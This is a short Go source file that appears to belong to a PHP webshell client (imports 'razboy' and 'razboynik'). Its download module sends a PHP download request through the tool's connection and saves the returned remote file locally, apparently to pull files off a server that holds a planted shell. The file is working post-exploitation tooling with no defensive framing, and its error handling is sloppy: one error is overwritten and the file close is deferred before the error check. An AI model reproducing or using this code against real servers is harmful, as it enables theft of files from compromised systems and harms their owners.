package phpmodule

import (
	"errors"
	"io"
	"os"

	"github.com/eatbytes/razboy/network"
	"github.com/eatbytes/razboy/php"
	"github.com/eatbytes/razboy/shell"
	"github.com/eatbytes/razboynik/bash"
)

func DownloadInit(bc *bash.BashCommand) {
	var (
		path, location, resp string
		err                  error
		n                    *network.NETWORK
		s                    *shell.SHELL
		p                    *php.PHP
	)

	if bc.GetArrLgt() < 2 {
		err = errors.New("Please write the path of the file to download")
		bc.WriteError(err)
		return
	}

	n, s, p = bc.GetObjects()
	path = getPath(bc.GetArr(), s.GetContext())
	location = bc.GetArrItem(2, "output.txt")

	resp, err = Download(n, p, path, location)

	bc.Write(resp, err)
}

func getPath(arr []string, context string) string {
	path := arr[1]

	if context != "" {
		path = context + "/" + path
	}

	return path
}

func Download(n *network.NETWORK, p *php.PHP, remote, local string) (string, error) {
	var (
		req  string
		err  error
		resp *network.Response
		out  *os.File
	)

	req = p.Download(remote)
	resp, err = n.PrepareSend(req)

	out, err = os.Create(local)

	defer out.Close()

	if err != nil {
		return "", err
	}

	_, err = io.Copy(out, resp.Http.Body)

	if err != nil {
		return "", err
	}

	return "Downloaded successfully to " + local, nil
}
